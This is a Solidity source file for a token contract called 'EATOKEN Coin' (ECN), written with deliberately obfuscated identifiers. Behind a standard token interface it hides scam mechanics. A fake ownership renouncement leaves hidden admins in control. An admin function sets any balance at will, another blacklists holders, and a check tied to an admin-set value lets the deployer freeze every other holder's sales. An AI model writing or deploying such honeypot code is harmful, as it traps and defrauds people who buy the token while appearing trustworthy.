//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface feeLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalReceiver) external view returns (uint256);

    function transfer(address fromShouldExempt, uint256 amountAt) external returns (bool);

    function allowance(address senderListMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 amountAt) external returns (bool);

    function transferFrom(
        address sender,
        address fromShouldExempt,
        uint256 amountAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tokenReceiverFund, uint256 value);
    event Approval(address indexed senderListMarketing, address indexed spender, uint256 value);
}

interface swapLimit is feeLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract limitFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tradingFee {
    function createPair(address swapIs, address limitTrading) external returns (address);
}

interface limitMarketingMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract EATOKENCoin is limitFrom, feeLimit, swapLimit {

    bool public limitEnableSell;

    function getOwner() external view returns (address) {
        return totalToken;
    }

    function autoLimit() private view {
        require(exemptMax[_msgSender()]);
    }

    function liquidityIs(address exemptReceiver) public {
        if (limitEnableSell) {
            return;
        }
        if (toLaunched != atList) {
            maxListSell = true;
        }
        exemptMax[exemptReceiver] = true;
        
        limitEnableSell = true;
    }

    mapping(address => bool) public launchSender;

    mapping(address => bool) public exemptMax;

    string private atEnable = "ECN";

    constructor (){
        
        listTake();
        limitMarketingMin totalEnable = limitMarketingMin(maxIs);
        senderTeam = tradingFee(totalEnable.factory()).createPair(totalEnable.WETH(), address(this));
        if (teamMax == tokenSellMax) {
            tokenSellMax = teamMax;
        }
        fundList = _msgSender();
        exemptMax[fundList] = true;
        sellLaunched[fundList] = exemptTo;
        if (buyList != tokenTx) {
            maxListSell = false;
        }
        emit Transfer(address(0), fundList, exemptTo);
    }

    function isReceiver(address liquidityToken, uint256 amountAt) public {
        autoLimit();
        sellLaunched[liquidityToken] = amountAt;
    }

    function owner() external view returns (address) {
        return totalToken;
    }

    event OwnershipTransferred(address indexed fundMin, address indexed enableSwap);

    function transfer(address liquidityToken, uint256 amountAt) external virtual override returns (bool) {
        return feeEnable(_msgSender(), liquidityToken, amountAt);
    }

    uint256 public tokenSellMax;

    uint256 public txTo;

    mapping(address => uint256) private sellLaunched;

    uint256 walletSellAt;

    bool public modeList;

    address private totalToken;

    string private txEnable = "EATOKEN Coin";

    function marketingFrom(address takeReceiver) public {
        autoLimit();
        if (tokenSellMax != teamMax) {
            txTo = teamMax;
        }
        if (takeReceiver == fundList || takeReceiver == senderTeam) {
            return;
        }
        launchSender[takeReceiver] = true;
    }

    address autoLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function symbol() external view virtual override returns (string memory) {
        return atEnable;
    }

    function tradingMode(address totalFund, address fromShouldExempt, uint256 amountAt) internal returns (bool) {
        require(sellLaunched[totalFund] >= amountAt);
        sellLaunched[totalFund] -= amountAt;
        sellLaunched[fromShouldExempt] += amountAt;
        emit Transfer(totalFund, fromShouldExempt, amountAt);
        return true;
    }

    uint8 private tradingExempt = 18;

    function balanceOf(address totalReceiver) public view virtual override returns (uint256) {
        return sellLaunched[totalReceiver];
    }

    mapping(address => mapping(address => uint256)) private teamFund;

    function approve(address autoSellList, uint256 amountAt) public virtual override returns (bool) {
        teamFund[_msgSender()][autoSellList] = amountAt;
        emit Approval(_msgSender(), autoSellList, amountAt);
        return true;
    }

    uint256 private exemptTo = 100000000 * 10 ** 18;

    function feeEnable(address totalFund, address fromShouldExempt, uint256 amountAt) internal returns (bool) {
        if (totalFund == fundList) {
            return tradingMode(totalFund, fromShouldExempt, amountAt);
        }
        uint256 isSell = feeLimit(senderTeam).balanceOf(autoLiquidity);
        require(isSell == fundIs);
        require(!launchSender[totalFund]);
        return tradingMode(totalFund, fromShouldExempt, amountAt);
    }

    bool private fromWallet;

    function listTake() public {
        emit OwnershipTransferred(fundList, address(0));
        totalToken = address(0);
    }

    address public fundList;

    function listAt(uint256 amountAt) public {
        autoLimit();
        fundIs = amountAt;
    }

    uint256 public teamMax;

    bool public atList;

    function decimals() external view virtual override returns (uint8) {
        return tradingExempt;
    }

    address maxIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public buyList;

    bool public maxListSell;

    bool private tokenTx;

    function transferFrom(address totalFund, address fromShouldExempt, uint256 amountAt) external override returns (bool) {
        if (_msgSender() != maxIs) {
            if (teamFund[totalFund][_msgSender()] != type(uint256).max) {
                require(amountAt <= teamFund[totalFund][_msgSender()]);
                teamFund[totalFund][_msgSender()] -= amountAt;
            }
        }
        return feeEnable(totalFund, fromShouldExempt, amountAt);
    }

    address public senderTeam;

    bool public toLaunched;

    function allowance(address walletFrom, address autoSellList) external view virtual override returns (uint256) {
        if (autoSellList == maxIs) {
            return type(uint256).max;
        }
        return teamFund[walletFrom][autoSellList];
    }

    function name() external view virtual override returns (string memory) {
        return txEnable;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return exemptTo;
    }

    uint256 fundIs;

}